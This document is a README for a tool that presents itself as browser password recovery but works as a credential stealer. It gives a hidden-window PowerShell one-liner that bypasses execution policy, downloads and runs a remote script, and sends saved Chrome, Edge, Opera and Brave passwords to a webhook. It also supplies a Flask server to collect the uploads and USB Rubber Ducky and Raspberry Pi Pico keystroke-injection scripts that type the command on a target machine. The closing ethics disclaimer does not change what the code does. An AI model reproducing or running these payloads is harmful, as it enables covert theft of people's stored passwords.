# 🔐 Chrome, Edge, Opera and Brave Password Recovery Tool 🔐

## 📱 Overview

This tool helps you recover saved passwords from Chrome, Edge, Opera and Brave browsers when you've forgotten them. Perfect for IT professionals who need to retrieve credentials for work purposes or individuals who need to recover their own forgotten passwords.

## ✨ Features

- 🔍 Recovers passwords from Chrome, Edge, Opera and Brave browsers
- 👤 Works with multiple browser profiles
- 🔄 Automatically generates a Python script to decrypt the passwords
- 📊 Provides a neat summary of recovered credentials
- 🛡️ Simple one-line command for quick recovery

## 🚀 Quick Start

Simply run the following command in a PowerShell window:

```powershell
start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pentestfunctions/chrome_brave_password_webhook/refs/heads/main/dcinfosnd.ps1' -OutFile 'temp.ps1'; . .\temp.ps1; dcinfosnd -hq 'YOUR_WEBHOOK_URL'; Remove-Item 'temp.ps1'"
```

⚠️ Be sure to replace `YOUR_WEBHOOK_URL` with your actual webhook URL where the password data will be sent.

## 🌐 Setting Up Your Webhook

You'll need a webhook URL to receive the Python decryption script. Here are some options:

1. **Discord Webhook**: 
   - Create a Discord server
   - Go to Server Settings > Integrations > Webhooks
   - Create a new webhook and copy the URL

2. **Custom Server**:
   - Set up a simple Python server with Flask:

```python
from flask import Flask, request, jsonify
import os

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    if 'file' in request.files:
        file = request.files['file']
        file.save(os.path.join('uploads', file.filename))
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

if __name__ == '__main__':
    os.makedirs('uploads', exist_ok=True)
    app.run(host='0.0.0.0', port=5000)
```

## 📋 Requirements

- Windows operating system
- Chrome, Edge, Opera or Bravr installed
- PowerShell
- Administrator privileges (for best results)

## 🔧 How It Works

1. The tool stops any running Chrome, Edge, Opera and Brave processes
2. Extracts encrypted passwords from the browsers
3. Prepares a Python decryption script
4. Sends the script to your specified webhook
5. The script can then be run to decrypt all the passwords

## 🐍 Decrypting the Passwords Locally

When you receive the Python script, you'll need to:

1. Install the required library:
```bash
pip install pycryptodomex
```

2. Run the decryption script:
```bash
python browser_decrypt.py
```

### Why Local Decryption?

We decrypt passwords locally for several important reasons:
- 🔒 **Security**: Keeps your sensitive data on your machine
- 🚫 **Size Limitations**: Webhooks often have character limits
- ⚙️ **Complexity**: Browser encryption requires specific Python libraries
- 🔑 **Access Control**: Ensures only you can access the decrypted passwords

## 🦆 Automation Options

### USB Rubber Ducky Script

For automated deployment using a USB Rubber Ducky:

```
REM Chrome, Edge, Opera and Brave Password Recovery Tool
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pentestfunctions/chrome_brave_password_webhook/refs/heads/main/dcinfosnd.ps1' -OutFile 'temp.ps1'; . .\temp.ps1; dcinfosnd -hq 'YOUR_WEBHOOK_URL'; Remove-Item 'temp.ps1'
ENTER
```

### Raspberry Pi Pico Implementation

You can also run this using a Raspberry Pi Pico with CircuitPython:

```python
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Initialize keyboard
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

# Wait for the computer to recognize Pico
time.sleep(2)  

# Open Run window
keyboard.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.5)

# Open command prompt
layout.write("cmd")
keyboard.send(Keycode.ENTER)
time.sleep(0.3)

# Run the password recovery command
layout.write("start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pentestfunctions/chrome_brave_password_webhook/refs/heads/main/dcinfosnd.ps1' -OutFile 'temp.ps1'; . .\\temp.ps1; dcinfosnd -hq 'YOUR_WEBHOOK_URL'; Remove-Item 'temp.ps1'\"")
keyboard.send(Keycode.ENTER)
```

Make sure to replace `'YOUR_WEBHOOK_URL'` with your actual webhook URL in both examples.

## 🛑 Important Notes

- This tool is designed for **legitimate password recovery** of your own accounts or within authorized systems
- Always obtain proper authorization before recovering passwords on systems you don't own
- Use responsibly and ethically
